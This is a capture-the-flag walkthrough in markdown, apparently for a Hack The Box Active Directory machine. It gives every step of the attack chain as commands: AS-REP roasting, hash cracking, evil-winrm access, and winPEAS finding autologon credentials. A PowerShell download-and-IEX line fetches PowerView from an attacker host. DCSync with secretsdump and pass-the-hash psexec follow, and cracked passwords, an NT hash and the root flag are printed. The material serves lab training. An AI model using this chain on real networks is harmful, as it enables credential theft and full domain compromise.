## User
### Web
```
Go To http://10.129.95.180/about.html
Scroll to bottom
```
#### Interesting Fields
put this in a text file.
```
Bowie Taylor
Sophie Driver
Shaun Coins
Steven Kerb
Hugo Bear
Fergus Smith
```
### Create Username List with #usernameAnarchy
```
git clone https://github.com/urbanadventurer/username-anarchy
cd username-anarchy
./username-anarchy --input-file ../users.txt --select-format FirstLast,firstlast,First.Last,first.last,f.last,flast > ../pot_usersnames.txt
```
### Impacket As-Rep Roast #impacket-GetNPUsers 
```sh
impacket-GetNPUsers 'egotistical-bank.local/' -dc-ip '10.129.95.180' -usersfile pot_usersnames.txt -request
```
### Crack Ticket #hashcat
```sh
hashcat kerbticket_fsmith.txt ~/Downloads/rockyou.txt 
# Thestrokes23
```
### Evil-WinRM for User PWN #evil-winrm 
```sh
evil-winrm -i 10.129.95.180 -u fsmith -p Thestrokes23
```

```winrm
type ../Desktop/user.txt
```
## ROOT
### WinPeas Download for profit #winpeas
[Release Release refs/heads/master 20240519-fab0d0d5 · peass-ng/PEASS-ng (github.com)](https://github.com/peass-ng/PEASS-ng/releases/tag/20240519-fab0d0d5)
```sh
wget https://github.com/peass-ng/PEASS-ng/releases/download/20240519-fab0d0d5/winPEASany.exe
```
### WinRM winpeas upload #winpeas 
```winrm
upload /home/kali/Desktop/Sauna/winPEASany.exe
./winPEASany.exe
```
This gives us a User as AutoLogon credentials are found #credentials-found
```
user:EGOTISTICALBANK\svc_loanmgr
password: Moneymakestheworldgoround!
```
### WinRM Login as AutoLogon  Powerview check permissions
#failure-winrm
#powerview
```sh
evil-winrm -i 10.129.95.180 -u svc_loanmgr -p Moneymakestheworldgoround!
```
[DCSync | HackTricks | HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)
```winrm
(New-Object System.Net.WebClient).DownloadString('http://10.10.14.5:8000/PowerView.ps1') | IEX
Get-ObjectAcl -DistinguishedName "dc=EGOTISTICAL-BANK,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
This gives us:
```
AceType               : AccessAllowed
ObjectDN              : DC=EGOTISTICAL-BANK,DC=LOCAL
ActiveDirectoryRights : CreateChild, Self, WriteProperty, ExtendedRight, GenericRead, WriteDacl, WriteOwner
OpaqueLength          : 0
ObjectSID             : S-1-5-21-2966785786-3096785034-1186376766
InheritanceFlags      : None
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-2966785786-3096785034-1186376766-512
AccessMask            : 917949
AuditFlags            : None
AceFlags              : None
AceQualifier          : AccessAllowed

AceType               : AccessAllowed
ObjectDN              : DC=EGOTISTICAL-BANK,DC=LOCAL
ActiveDirectoryRights : GenericAll
OpaqueLength          : 0
ObjectSID             : S-1-5-21-2966785786-3096785034-1186376766
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-2966785786-3096785034-1186376766-519
AccessMask            : 983551
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed

AceType               : AccessAllowed
ObjectDN              : DC=EGOTISTICAL-BANK,DC=LOCAL
ActiveDirectoryRights : CreateChild, Self, WriteProperty, ExtendedRight, Delete, GenericRead, WriteDacl, WriteOwner
OpaqueLength          : 0
ObjectSID             : S-1-5-21-2966785786-3096785034-1186376766
InheritanceFlags      : ContainerInherit
BinaryLength          : 24
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-32-544
AccessMask            : 983485
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed

**AceType               : AccessAllowed**
ObjectDN              : DC=EGOTISTICAL-BANK,DC=LOCAL
**ActiveDirectoryRights : GenericAll**
OpaqueLength          : 0
ObjectSID             : S-1-5-21-2966785786-3096785034-1186376766
InheritanceFlags      : None
BinaryLength          : 20
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-18
AccessMask            : 983551
AuditFlags            : None
AceFlags              : None
**AceQualifier          : AccessAllowed**

```

```winrm
(get-acl).access
exit

```
reveals:
#AD-permissions-permissive
```
FileSystemRights  : FullControl
AccessControlType : Allow
IdentityReference : NT AUTHORITY\SYSTEM
IsInherited       : True
InheritanceFlags  : ContainerInherit, ObjectInherit
PropagationFlags  : None

FileSystemRights  : FullControl
AccessControlType : Allow
IdentityReference : BUILTIN\Administrators
IsInherited       : True
InheritanceFlags  : ContainerInherit, ObjectInherit
PropagationFlags  : None

FileSystemRights  : FullControl
AccessControlType : Allow
IdentityReference : EGOTISTICALBANK\svc_loanmgr
IsInherited       : True
InheritanceFlags  : ContainerInherit, ObjectInherit
PropagationFlags  : None
```
### DCSync with #impacket-secretsdump
```sh
impacket-secretsdump 'svc_loanmgr:Moneymakestheworldgoround!@10.129.95.180' -outputfile dcsynchashes.txt
```
Crack the hashes
#hashcat
```sh
hashcat dcsynchashes.txt.ntds.kerberos ~/Downloads/rockyou.txt
```
### PSExec Privilege Escalation #impacket-psexec

```sh
impacket-psexec administrator@10.129.95.180 -hashes "aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e"
```

```winrm
type C:\Users\Administrator\Desktop\root.txt
```
178cd16fd283bda81abb087e93796dd0